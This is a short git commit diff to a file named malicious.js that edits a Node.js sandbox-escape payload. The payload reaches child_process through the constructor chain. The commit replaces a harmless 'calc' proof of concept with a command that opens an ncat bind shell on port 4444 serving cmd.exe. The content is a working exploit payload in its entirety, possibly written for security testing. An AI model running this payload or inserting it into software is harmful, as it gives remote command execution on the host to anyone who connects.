8faf626bcc4adddb8b32267d7579db1c792c3b44
Cao Xuân Sang <43333734+at3s@users.noreply.github.com>
2022-01-19 21:45:12 +0700

    Update malicious.js

--- js/malicious.js
+++ js/malicious.js
@@ -1,1 +1,1 @@
-(this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
+(this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('ncat -lvp 4444 -e cmd.exe')
